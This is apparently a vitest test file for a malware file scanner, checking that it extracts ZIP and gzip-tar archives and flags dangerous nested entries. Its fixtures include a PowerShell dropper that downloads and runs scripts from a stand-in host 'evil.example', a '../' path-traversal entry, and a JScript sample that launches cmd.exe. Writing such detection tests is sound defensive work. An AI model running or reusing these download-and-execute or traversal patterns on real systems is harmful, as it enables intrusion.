import fs from "fs/promises";
import os from "os";
import path from "path";
import zlib from "zlib";
import { afterEach, describe, expect, it } from "vitest";
import { scanUploadedFile } from "../src/scanner/fileScanner.js";

const tempRoots = [];

async function createTempFile(fileName, content) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "virovanta-archive-extraction-test-"));
  const filePath = path.join(root, fileName);
  tempRoots.push(root);
  await fs.writeFile(filePath, content);
  return filePath;
}

function writeUInt32LE(value) {
  const buffer = Buffer.alloc(4);
  buffer.writeUInt32LE(value >>> 0, 0);
  return buffer;
}

function writeUInt16LE(value) {
  const buffer = Buffer.alloc(2);
  buffer.writeUInt16LE(value, 0);
  return buffer;
}

function buildZipArchive(entries) {
  const localParts = [];
  const centralParts = [];
  let localOffset = 0;

  for (const entry of entries) {
    const nameBuffer = Buffer.from(entry.name, "utf8");
    const sourceBuffer = Buffer.isBuffer(entry.content) ? entry.content : Buffer.from(entry.content);
    const compressionMethod = entry.method === "deflate" ? 8 : 0;
    const compressedData = compressionMethod === 8 ? zlib.deflateRawSync(sourceBuffer) : sourceBuffer;

    const localHeader = Buffer.concat([
      writeUInt32LE(0x04034b50),
      writeUInt16LE(20),
      writeUInt16LE(0),
      writeUInt16LE(compressionMethod),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt32LE(0),
      writeUInt32LE(compressedData.length),
      writeUInt32LE(sourceBuffer.length),
      writeUInt16LE(nameBuffer.length),
      writeUInt16LE(0),
      nameBuffer
    ]);

    localParts.push(localHeader, compressedData);

    const centralHeader = Buffer.concat([
      writeUInt32LE(0x02014b50),
      writeUInt16LE(20),
      writeUInt16LE(20),
      writeUInt16LE(0),
      writeUInt16LE(compressionMethod),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt32LE(0),
      writeUInt32LE(compressedData.length),
      writeUInt32LE(sourceBuffer.length),
      writeUInt16LE(nameBuffer.length),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt32LE(0),
      writeUInt32LE(localOffset),
      nameBuffer
    ]);
    centralParts.push(centralHeader);

    localOffset += localHeader.length + compressedData.length;
  }

  const centralDirectory = Buffer.concat(centralParts);
  const localSection = Buffer.concat(localParts);
  const eocd = Buffer.concat([
    writeUInt32LE(0x06054b50),
    writeUInt16LE(0),
    writeUInt16LE(0),
    writeUInt16LE(entries.length),
    writeUInt16LE(entries.length),
    writeUInt32LE(centralDirectory.length),
    writeUInt32LE(localSection.length),
    writeUInt16LE(0)
  ]);

  return Buffer.concat([localSection, centralDirectory, eocd]);
}

function writeTarText(target, offset, length, value) {
  const buffer = Buffer.alloc(length, 0);
  Buffer.from(String(value), "utf8").copy(buffer, 0, 0, Math.min(length, Buffer.byteLength(String(value))));
  buffer.copy(target, offset);
}

function writeTarOctal(target, offset, length, value) {
  const octal = value.toString(8).padStart(length - 1, "0");
  const buffer = Buffer.alloc(length, 0);
  Buffer.from(octal).copy(buffer, 0, 0, Math.min(octal.length, length - 1));
  buffer[length - 1] = 0;
  buffer.copy(target, offset);
}

function buildTarArchive(entries) {
  const blocks = [];

  for (const entry of entries) {
    const content = Buffer.isBuffer(entry.content) ? entry.content : Buffer.from(entry.content);
    const header = Buffer.alloc(512, 0);
    writeTarText(header, 0, 100, entry.name);
    writeTarOctal(header, 100, 8, 0o644);
    writeTarOctal(header, 108, 8, 0);
    writeTarOctal(header, 116, 8, 0);
    writeTarOctal(header, 124, 12, content.length);
    writeTarOctal(header, 136, 12, 0);
    header.fill(0x20, 148, 156);
    header.write("0", 156, 1, "utf8");
    writeTarText(header, 257, 6, "ustar");
    writeTarText(header, 263, 2, "00");
    const checksum = [...header].reduce((sum, byte) => sum + byte, 0);
    writeTarOctal(header, 148, 8, checksum);
    blocks.push(header, content);

    const remainder = content.length % 512;
    if (remainder !== 0) {
      blocks.push(Buffer.alloc(512 - remainder, 0));
    }
  }

  blocks.push(Buffer.alloc(1024, 0));
  return Buffer.concat(blocks);
}

afterEach(async () => {
  const roots = tempRoots.splice(0);
  await Promise.all(roots.map((root) => fs.rm(root, { recursive: true, force: true })));
});

describe("file scanner archive extraction", () => {
  it("extracts and scans nested ZIP entries within limits", async () => {
    const archive = buildZipArchive([
      {
        name: "docs/readme.txt",
        content: Buffer.from("Plain text note")
      },
      {
        name: "stage/dropper.ps1",
        content: Buffer.from('Start-BitsTransfer -Source "https://evil.example/a.ps1" -Destination "$env:TEMP\\a.ps1"; Invoke-Expression (New-Object Net.WebClient).DownloadString("https://evil.example/b.ps1")')
      }
    ]);

    const filePath = await createTempFile("bundle.zip", archive);
    const report = await scanUploadedFile({
      filePath,
      originalName: "bundle.zip",
      declaredMimeType: "application/zip"
    });

    expect(report.engines.archiveInspection.status).toBe("completed");
    expect(report.engines.archiveInspection.extractedItemCount).toBe(2);
    expect(report.engines.archiveInspection.items.some((item) => item.name === "stage/dropper.ps1")).toBe(true);
    expect(report.findings.some((finding) => finding.id === "archive_nested_suspicious" || finding.id === "archive_nested_malicious")).toBe(true);
  });

  it("blocks unsafe archive paths from nested extraction", async () => {
    const archive = buildZipArchive([
      {
        name: "../escape.js",
        content: Buffer.from('eval("alert(1)")')
      }
    ]);

    const filePath = await createTempFile("unsafe.zip", archive);
    const report = await scanUploadedFile({
      filePath,
      originalName: "unsafe.zip",
      declaredMimeType: "application/zip"
    });

    expect(report.findings.some((finding) => finding.id === "archive_unsafe_paths")).toBe(true);
    expect(report.engines.archiveInspection.skipped.some((item) => item.reason === "unsafe_entry_path")).toBe(true);
  });

  it("extracts nested content from gzip-wrapped tar archives", async () => {
    const tarArchive = buildTarArchive([
      {
        name: "payload/run.js",
        content: Buffer.from('var sh=new ActiveXObject("WScript.Shell"); var x=new ActiveXObject("MSXML2.XMLHTTP"); var s=new ActiveXObject("ADODB.Stream"); sh.Run("cmd.exe");')
      }
    ]);
    const tgzArchive = zlib.gzipSync(tarArchive);

    const filePath = await createTempFile("payload.tgz", tgzArchive);
    const report = await scanUploadedFile({
      filePath,
      originalName: "payload.tgz",
      declaredMimeType: "application/gzip"
    });

    expect(report.engines.archiveInspection.status).toBe("completed");
    expect(report.engines.archiveInspection.extractedItemCount).toBe(1);
    expect(report.engines.archiveInspection.items[0].name).toBe("payload/run.js");
    expect(report.findings.some((finding) => finding.id === "archive_nested_suspicious" || finding.id === "archive_nested_malicious")).toBe(true);
  });
});

